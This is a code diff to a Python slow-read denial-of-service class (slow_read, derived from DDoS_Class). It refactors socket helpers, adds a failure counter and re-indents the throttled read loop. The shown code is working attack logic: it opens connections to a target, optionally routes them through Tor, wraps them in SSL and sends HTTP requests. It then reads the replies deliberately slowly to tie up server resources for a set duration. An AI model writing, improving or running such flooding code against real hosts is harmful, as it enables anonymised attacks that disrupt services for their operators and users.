@@ -39,6 +39,7 @@ class slow_read(DDoS_Class):
     ):
         self.ssl_on=ssl_on
         self.counter = 0
+        self.fails=0
         self.cookie = cookie
         self.user_agents = user_agents
         if not self.user_agents or len(self.user_agents) == 0:
@@ -76,11 +77,11 @@ class slow_read(DDoS_Class):
                     break
                 try:
                     if self.tor==True:
-                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                     else:
-                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
+                        s=Socket_Connection.get_socket_connection(self.target,self.port,timeout=self.timeout)
                     if self.port==443 or self.ssl_on==True:
-                        s=wrap_socket_with_ssl(s,self.target)
+                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                     while True:
                         if (
                             int(time.time() - self.start) >= self.duration
@@ -90,7 +91,7 @@ class slow_read(DDoS_Class):
                             break
                         try:
                             s.send(
-                                setup_http_packet(
+                                Socket_Connection.setup_http_packet(
                                     self.target,
                                     3,
                                     self.paths,
@@ -113,12 +114,13 @@ class slow_read(DDoS_Class):
                                     )
                                     sys.stdout.flush()
                                     # print("Received: {}".format(str(d.decode('utf-8'))))
-                            time.sleep(random.randint(self.min_speed, self.max_speed))
+                                time.sleep(random.randint(self.min_speed, self.max_speed))
                         except:
+                            self.fails+=1
                             break
                     s.close()
                 except:
-                    pass
+                    self.fails+=1
             self.kill()
         except:
             pass
